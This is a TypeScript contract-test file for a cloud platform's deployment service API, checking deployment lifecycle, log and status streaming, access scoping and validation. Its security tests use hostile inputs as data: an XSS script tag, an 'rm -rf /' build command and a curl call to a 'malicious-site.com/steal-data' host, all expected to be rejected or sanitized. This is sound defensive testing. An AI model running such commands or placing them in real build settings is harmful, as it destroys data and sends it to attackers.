import { describe, it, expect, beforeEach } from 'vitest';
import { ConnectRouter } from '@connectrpc/connect';
import { DeploymentService } from '../../src/generated/obiente/cloud/deployments/v1/deployment_service_connect';
import {
  ListDeploymentsRequest,
  ListDeploymentsResponse,
  CreateDeploymentRequest,
  CreateDeploymentResponse,
  GetDeploymentRequest,
  GetDeploymentResponse,
  UpdateDeploymentRequest,
  UpdateDeploymentResponse,
  TriggerDeploymentRequest,
  TriggerDeploymentResponse,
  StreamDeploymentStatusRequest,
  DeploymentStatusUpdate,
  GetDeploymentLogsRequest,
  GetDeploymentLogsResponse,
  Deployment,
  Pagination,
} from '../../src/generated/obiente/cloud/deployments/v1/deployment_service_pb';

/**
 * Contract tests for DeploymentService protobuf interface
 * These tests validate deployment lifecycle operations and streaming
 * Tests should FAIL initially until DeploymentService is implemented
 */
describe('DeploymentService Contract Tests', () => {
  let deploymentService: DeploymentService;
  const mockOrgId = 'org_123';
  const mockDeploymentId = 'deploy_456';

  beforeEach(() => {
    // This will fail until DeploymentService is properly implemented
    deploymentService = new DeploymentService();
  });

  describe('ListDeployments', () => {
    it('should accept ListDeploymentsRequest and return ListDeploymentsResponse', async () => {
      const request = new ListDeploymentsRequest({
        organizationId: mockOrgId,
        page: 1,
        perPage: 10,
      });

      // This will fail - no implementation yet
      const response = await deploymentService.listDeployments(request);

      expect(response).toBeInstanceOf(ListDeploymentsResponse);
      expect(response.deployments).toBeInstanceOf(Array);
      expect(response.pagination).toBeInstanceOf(Pagination);
      expect(response.pagination.page).toBe(1);
      expect(response.pagination.perPage).toBe(10);
    });

    it('should filter by deployment status when provided', async () => {
      const request = new ListDeploymentsRequest({
        organizationId: mockOrgId,
        status: 'ready',
        page: 1,
        perPage: 10,
      });

      const response = await deploymentService.listDeployments(request);

      // All returned deployments should have 'ready' status
      for (const deployment of response.deployments) {
        expect(deployment.status).toBe('ready');
      }
    });

    it('should respect organization-scoped access', async () => {
      const request = new ListDeploymentsRequest({
        organizationId: 'unauthorized_org',
        page: 1,
        perPage: 10,
      });

      await expect(deploymentService.listDeployments(request)).rejects.toThrow(/not found|unauthorized/i);
    });

    it('should return deployments with complete information', async () => {
      const request = new ListDeploymentsRequest({
        organizationId: mockOrgId,
        page: 1,
        perPage: 10,
      });

      const response = await deploymentService.listDeployments(request);

      for (const deployment of response.deployments) {
        expect(deployment.id).toBeDefined();
        expect(deployment.name).toBeDefined();
        expect(deployment.domain).toBeDefined();
        expect(['static', 'nodejs', 'python', 'docker']).toContain(deployment.type);
        expect(['building', 'ready', 'error', 'stopped']).toContain(deployment.status);
        expect(['healthy', 'degraded', 'unhealthy']).toContain(deployment.healthStatus);
        expect(deployment.bandwidthUsage).toBeGreaterThanOrEqual(0);
        expect(deployment.storageUsage).toBeGreaterThanOrEqual(0);
      }
    });
  });

  describe('CreateDeployment', () => {
    it('should accept CreateDeploymentRequest and return CreateDeploymentResponse', async () => {
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'My Portfolio',
        type: 'static',
        repositoryUrl: 'https://github.com/user/portfolio',
        branch: 'main',
        buildCommand: 'npm run build',
        installCommand: 'npm install',
      });

      // This will fail - no implementation yet
      const response = await deploymentService.createDeployment(request);

      expect(response).toBeInstanceOf(CreateDeploymentResponse);
      expect(response.deployment).toBeInstanceOf(Deployment);
      expect(response.deployment.name).toBe('My Portfolio');
      expect(response.deployment.type).toBe('static');
      expect(response.deployment.repositoryUrl).toBe('https://github.com/user/portfolio');
      expect(response.deployment.branch).toBe('main');
      expect(response.deployment.status).toBe('building');
      expect(response.deployment.domain).toBeDefined();
      expect(response.deployment.id).toBeDefined();
    });

    it('should validate deployment name requirements', async () => {
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: '', // Empty name
        type: 'static',
        branch: 'main',
      });

      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/name/i);
    });

    it('should validate deployment type', async () => {
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'Test Deployment',
        type: 'invalid-type',
        branch: 'main',
      });

      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/type/i);
    });

    it('should validate repository URL format when provided', async () => {
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'Test Deployment',
        type: 'static',
        repositoryUrl: 'invalid-url',
        branch: 'main',
      });

      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/repository/i);
    });

    it('should validate branch name format', async () => {
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'Test Deployment',
        type: 'static',
        branch: '', // Empty branch
      });

      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/branch/i);
    });

    it('should respect organization deployment limits', async () => {
      // Mock organization with deployment limit reached
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'Over Limit Deployment',
        type: 'static',
        branch: 'main',
      });

      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/limit/i);
    });

    it('should generate unique subdomain for deployment', async () => {
      const request1 = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'App One',
        type: 'static',
        branch: 'main',
      });

      const request2 = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'App Two',
        type: 'static',
        branch: 'main',
      });

      const [response1, response2] = await Promise.all([
        deploymentService.createDeployment(request1),
        deploymentService.createDeployment(request2),
      ]);

      expect(response1.deployment.domain).not.toBe(response2.deployment.domain);
      expect(response1.deployment.domain).toMatch(/^https?:\/\/.+$/);
      expect(response2.deployment.domain).toMatch(/^https?:\/\/.+$/);
    });
  });

  describe('GetDeployment', () => {
    it('should accept GetDeploymentRequest and return GetDeploymentResponse', async () => {
      const request = new GetDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      // This will fail - no implementation yet
      const response = await deploymentService.getDeployment(request);

      expect(response).toBeInstanceOf(GetDeploymentResponse);
      expect(response.deployment).toBeInstanceOf(Deployment);
      expect(response.deployment.id).toBe(mockDeploymentId);
    });

    it('should enforce organization-scoped access', async () => {
      const request = new GetDeploymentRequest({
        organizationId: 'wrong_org',
        deploymentId: mockDeploymentId,
      });

      await expect(deploymentService.getDeployment(request)).rejects.toThrow(/not found|unauthorized/i);
    });

    it('should return complete deployment details', async () => {
      const request = new GetDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      const response = await deploymentService.getDeployment(request);

      const deployment = response.deployment;
      expect(deployment.customDomains).toBeInstanceOf(Array);
      expect(deployment.createdAt).toBeDefined();
      expect(deployment.lastDeployedAt).toBeDefined();
    });
  });

  describe('UpdateDeployment', () => {
    it('should accept UpdateDeploymentRequest and return UpdateDeploymentResponse', async () => {
      const request = new UpdateDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
        name: 'Updated Name',
        branch: 'develop',
        buildCommand: 'npm run build:prod',
      });

      // This will fail - no implementation yet
      const response = await deploymentService.updateDeployment(request);

      expect(response).toBeInstanceOf(UpdateDeploymentResponse);
      expect(response.deployment.name).toBe('Updated Name');
      expect(response.deployment.branch).toBe('develop');
      expect(response.deployment.buildCommand).toBe('npm run build:prod');
    });

    it('should require deployment management permissions', async () => {
      const request = new UpdateDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
        name: 'Unauthorized Update',
      });

      // Mock user without deployment permissions
      await expect(deploymentService.updateDeployment(request)).rejects.toThrow(/permission/i);
    });

    it('should validate updated field values', async () => {
      const request = new UpdateDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
        branch: '', // Invalid empty branch
      });

      await expect(deploymentService.updateDeployment(request)).rejects.toThrow(/branch/i);
    });
  });

  describe('TriggerDeployment', () => {
    it('should accept TriggerDeploymentRequest and return TriggerDeploymentResponse', async () => {
      const request = new TriggerDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      // This will fail - no implementation yet
      const response = await deploymentService.triggerDeployment(request);

      expect(response).toBeInstanceOf(TriggerDeploymentResponse);
      expect(response.deploymentId).toBe(mockDeploymentId);
      expect(response.status).toBe('building');
    });

    it('should require deployment permissions', async () => {
      const request = new TriggerDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      await expect(deploymentService.triggerDeployment(request)).rejects.toThrow(/permission/i);
    });

    it('should prevent triggering deployment in invalid states', async () => {
      // Mock deployment already in building state
      const request = new TriggerDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: 'building_deployment_id',
      });

      await expect(deploymentService.triggerDeployment(request)).rejects.toThrow(/state|building/i);
    });

    it('should queue deployment if build system is busy', async () => {
      const request = new TriggerDeploymentRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      const response = await deploymentService.triggerDeployment(request);

      // Should handle queuing gracefully
      expect(['building', 'queued']).toContain(response.status);
    });
  });

  describe('StreamDeploymentStatus', () => {
    it('should accept StreamDeploymentStatusRequest and return stream', async () => {
      const request = new StreamDeploymentStatusRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      // This will fail - no implementation yet
      const stream = deploymentService.streamDeploymentStatus(request);

      expect(stream).toBeDefined();
      expect(typeof stream[Symbol.asyncIterator]).toBe('function');
    });

    it('should stream deployment status updates', async () => {
      const request = new StreamDeploymentStatusRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      const stream = deploymentService.streamDeploymentStatus(request);
      const updates: DeploymentStatusUpdate[] = [];

      // Collect first few updates
      let count = 0;
      for await (const update of stream) {
        updates.push(update);
        count++;
        if (count >= 3) break; // Don't run forever
      }

      expect(updates.length).toBeGreaterThan(0);
      
      for (const update of updates) {
        expect(update).toBeInstanceOf(DeploymentStatusUpdate);
        expect(update.deploymentId).toBe(mockDeploymentId);
        expect(['building', 'ready', 'error', 'stopped']).toContain(update.status);
        expect(['healthy', 'degraded', 'unhealthy']).toContain(update.healthStatus);
        expect(update.timestamp).toBeDefined();
      }
    });

    it('should enforce organization access for streaming', async () => {
      const request = new StreamDeploymentStatusRequest({
        organizationId: 'wrong_org',
        deploymentId: mockDeploymentId,
      });

      const stream = deploymentService.streamDeploymentStatus(request);

      await expect(async () => {
        for await (const update of stream) {
          // Should throw on first iteration
          break;
        }
      }).rejects.toThrow(/not found|unauthorized/i);
    });

    it('should handle stream disconnection gracefully', async () => {
      const request = new StreamDeploymentStatusRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      const stream = deploymentService.streamDeploymentStatus(request);

      // Simulate connection interruption
      setTimeout(() => {
        // Mock network interruption
      }, 100);

      // Should handle gracefully without throwing
      const updates: DeploymentStatusUpdate[] = [];
      try {
        for await (const update of stream) {
          updates.push(update);
          if (updates.length >= 2) break;
        }
      } catch (error) {
        // Connection errors should be handled gracefully
        expect(error).toBeDefined();
      }
    });
  });

  describe('GetDeploymentLogs', () => {
    it('should accept GetDeploymentLogsRequest and return GetDeploymentLogsResponse', async () => {
      const request = new GetDeploymentLogsRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
        lines: 100,
      });

      // This will fail - no implementation yet
      const response = await deploymentService.getDeploymentLogs(request);

      expect(response).toBeInstanceOf(GetDeploymentLogsResponse);
      expect(response.logs).toBeInstanceOf(Array);
      expect(response.logs.length).toBeLessThanOrEqual(100);
    });

    it('should return latest logs when lines not specified', async () => {
      const request = new GetDeploymentLogsRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
      });

      const response = await deploymentService.getDeploymentLogs(request);

      expect(response.logs.length).toBeGreaterThan(0);
      // Should have reasonable default limit
      expect(response.logs.length).toBeLessThanOrEqual(1000);
    });

    it('should enforce organization access for logs', async () => {
      const request = new GetDeploymentLogsRequest({
        organizationId: 'wrong_org',
        deploymentId: mockDeploymentId,
      });

      await expect(deploymentService.getDeploymentLogs(request)).rejects.toThrow(/not found|unauthorized/i);
    });

    it('should return logs in chronological order', async () => {
      const request = new GetDeploymentLogsRequest({
        organizationId: mockOrgId,
        deploymentId: mockDeploymentId,
        lines: 50,
      });

      const response = await deploymentService.getDeploymentLogs(request);

      // Logs should be ordered by timestamp (newest first typically)
      expect(response.logs.length).toBeGreaterThan(0);
      
      for (const log of response.logs) {
        expect(typeof log).toBe('string');
        expect(log.length).toBeGreaterThan(0);
      }
    });

    it('should handle deployments with no logs', async () => {
      const request = new GetDeploymentLogsRequest({
        organizationId: mockOrgId,
        deploymentId: 'new_deployment_id',
      });

      const response = await deploymentService.getDeploymentLogs(request);

      expect(response.logs).toBeInstanceOf(Array);
      expect(response.logs.length).toBe(0);
    });
  });

  describe('Security and Validation', () => {
    it('should validate all organizationId parameters', async () => {
      const requests = [
        () => deploymentService.listDeployments(new ListDeploymentsRequest({ organizationId: '', page: 1, perPage: 10 })),
        () => deploymentService.createDeployment(new CreateDeploymentRequest({ organizationId: '', name: 'test', type: 'static', branch: 'main' })),
        () => deploymentService.getDeployment(new GetDeploymentRequest({ organizationId: '', deploymentId: 'test' })),
      ];

      for (const request of requests) {
        await expect(request()).rejects.toThrow(/organization/i);
      }
    });

    it('should sanitize deployment names and commands', async () => {
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: '<script>alert("xss")</script>My App',
        type: 'static',
        branch: 'main',
        buildCommand: 'rm -rf / && npm run build',
      });

      const response = await deploymentService.createDeployment(request);

      // Should sanitize harmful content
      expect(response.deployment.name).not.toContain('<script>');
      expect(response.deployment.buildCommand).not.toContain('rm -rf');
      expect(response.deployment.name).toContain('My App');
    });

    it('should rate limit deployment triggers', async () => {
      const requests = Array.from({ length: 10 }, () =>
        new TriggerDeploymentRequest({
          organizationId: mockOrgId,
          deploymentId: mockDeploymentId,
        })
      );

      // Should implement rate limiting for rapid deployments
      const promises = requests.map(req => deploymentService.triggerDeployment(req));
      
      // Some later requests should be rate limited
      await expect(Promise.all(promises)).rejects.toThrow(/rate limit|too many/i);
    });

    it('should validate deployment configuration security', async () => {
      const request = new CreateDeploymentRequest({
        organizationId: mockOrgId,
        name: 'Test App',
        type: 'static',
        branch: 'main',
        buildCommand: 'curl http://malicious-site.com/steal-data',
      });

      // Should validate build commands for security
      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/security|command/i);
    });
  });

  describe('Performance Requirements', () => {
    it('should respond to list deployments within performance target', async () => {
      const request = new ListDeploymentsRequest({
        organizationId: mockOrgId,
        page: 1,
        perPage: 20,
      });

      const startTime = Date.now();
      await deploymentService.listDeployments(request);
      const endTime = Date.now();

      // Should meet <200ms requirement
      expect(endTime - startTime).toBeLessThan(200);
    });

    it('should handle concurrent deployment operations', async () => {
      const requests = Array.from({ length: 5 }, (_, i) =>
        new GetDeploymentRequest({
          organizationId: mockOrgId,
          deploymentId: `deployment_${i}`,
        })
      );

      const startTime = Date.now();
      const promises = requests.map(req => deploymentService.getDeployment(req));
      await Promise.allSettled(promises); // Allow some to fail
      const endTime = Date.now();

      // Concurrent requests should not significantly degrade performance
      expect(endTime - startTime).toBeLessThan(500);
    });
  });
});